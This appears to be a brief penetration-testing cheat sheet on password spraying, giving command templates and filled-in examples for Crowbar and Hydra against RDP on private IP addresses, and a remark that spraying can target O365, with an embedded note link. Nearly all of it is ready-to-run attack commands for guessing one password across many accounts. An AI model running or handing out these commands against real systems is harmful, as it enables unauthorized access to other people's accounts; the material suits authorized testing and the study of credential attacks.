-- -
Different ways (tools) to perform password spraying.
### Crowbar
```bash
crowbar -b <protocol> -s <ip/range> -U <userfile> -c '<passwd>'
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```
### Hydra
```bash
hydra -L <userlist> -p '<passwd>' <ip> <protocol>
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
### O365 
You can password spray directly ot O365 if the organization uses it. 
![[O365#^10833c]]